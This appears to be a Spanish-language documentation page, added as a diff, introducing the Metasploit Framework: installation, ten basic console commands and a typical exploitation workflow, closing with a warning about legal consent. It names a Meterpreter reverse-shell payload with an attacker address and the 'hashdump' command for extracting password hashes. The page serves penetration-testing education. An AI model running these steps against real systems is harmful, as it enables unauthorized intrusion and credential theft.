@@ -1,0 +1,114 @@
+---
+title: "Metasploit Framework"
+---
+
+Metasploit es la plataforma más utilizada en el mundo para el desarrollo, prueba y ejecución de exploits. Contiene miles de módulos, exploits y payloads pre-construidos para una amplia variedad de sistemas operativos como Windows, Linux, macOS, Android e iOS. Metasploit permite convertir una vulnerabilidad identificada en un compromiso total del sistema.
+
+## Instalación
+
+Metasploit viene integrado en Kali Linux y Parrot OS. Para otras distribuciones, se recomienda el instalador oficial de Rapid7.
+
+```text
+sudo apt update
+sudo apt install metasploit-framework -y
+```
+
+## Top 10 Comandos (Guía HexSec)
+
+Estos son los comandos fundamentales para manejar el flujo de trabajo en la consola de Metasploit (`msfconsole`):
+
+### 1. Iniciar Consola
+
+Lanza la interfaz interactiva de Metasploit.
+
+```text
+msfconsole
+```
+
+### 2. Buscar Módulos
+
+Encuentra exploits, payloads o auxiliares específicos por nombre o vulnerabilidad (ej: CVE).
+
+```text
+search [nombre_exploit]
+```
+
+### 3. Seleccionar Módulo
+
+Carga el exploit o módulo que deseas utilizar.
+
+```text
+use [exploit_path]
+```
+
+### 4. Mostrar Opciones
+
+Muestra todas las variables de configuración requeridas para el módulo actual.
+
+```text
+show options
+```
+
+### 5. Configurar Objetivo (RHOSTS)
+
+Establece la dirección IP o el rango de direcciones del sistema objetivo.
+
+```text
+set RHOSTS [Target_IP]
+```
+
+### 6. Configurar Atacante (LHOST)
+
+Establece tu propia dirección IP para las conexiones reversas (Reverse Shells).
+
+```text
+set LHOST [Your_IP]
+```
+
+### 7. Seleccionar Payload
+
+Define el código que se ejecutará en el objetivo tras el exploit exitoso (ej: Meterpreter).
+
+```text
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+### 8. Ejecutar Exploit
+
+Inicia el ataque contra el objetivo configurado.
+
+```text
+exploit
+```
+
+### 9. Interactuar con Sesiones
+
+Permite entrar de nuevo en una sesión activa de un sistema que ya ha sido comprometido.
+
+```text
+sessions -i [id]
+```
+
+### 10. Extraer Hashes (Meterpreter)
+
+Comando post-explotación para extraer los hashes de las contraseñas del objetivo desde la memoria.
+
+```text
+hashdump
+```
+
+## Flujo de Trabajo Típico
+
+Para llevar a cabo una explotación exitosa, sigue estos pasos:
+
+1. **Reconocimiento**: Identifica servicios y versiones con Nmap.
+2. **Búsqueda**: Busca exploits para esas versiones en Metasploit con `search`.
+3. **Configuración**: Selecciona el exploit (`use`) y configura los parámetros necesarios (`set RHOSTS`, `set PAYLOAD`).
+4. **Verificación**: Usa el comando `check` (si está disponible) para ver si el objetivo es vulnerable sin lanzar el exploit.
+5. **Explotación**: Lanza el `exploit` y gestiona la sesión con Meterpreter.
+
+<Warning>
+  **Importante**: Metasploit es una herramienta de intrusión real. Ejecutar exploits contra sistemas sin consentimiento es un delito grave. Asegúrate siempre de trabajar en laboratorios controlados o bajo contratos de auditoría legal.
+</Warning>
+
+_Contenido adaptado de la guía "Hacking Kali" por HexSec._
